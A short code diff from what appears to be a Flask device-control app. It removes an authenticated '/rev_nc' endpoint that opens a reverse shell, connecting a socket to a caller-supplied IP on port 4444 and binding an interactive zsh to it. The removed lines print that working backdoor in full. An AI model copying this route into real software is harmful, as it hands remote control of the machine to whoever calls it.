@@ -319,25 +319,6 @@ def focus():
                 shell=True).decode()
     return "success"
 
-
-
-@app.route("/rev_nc")
-@requires_auth
-def nc():
-    ip = request.args.get('ip', None)
-    if not ip:
-        abort(404)
-    import socket,subprocess,os
-    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-    s.connect((str(ip),4444))
-    os.dup2(s.fileno(),0)
-    os.dup2(s.fileno(),1)
-    os.dup2(s.fileno(),2)
-    p=subprocess.call(["/bin/zsh","-i"])
-    return "success"
-
-
-
 @app.route("/sync_hwclock")
 @requires_auth
 def sync_hwclock():
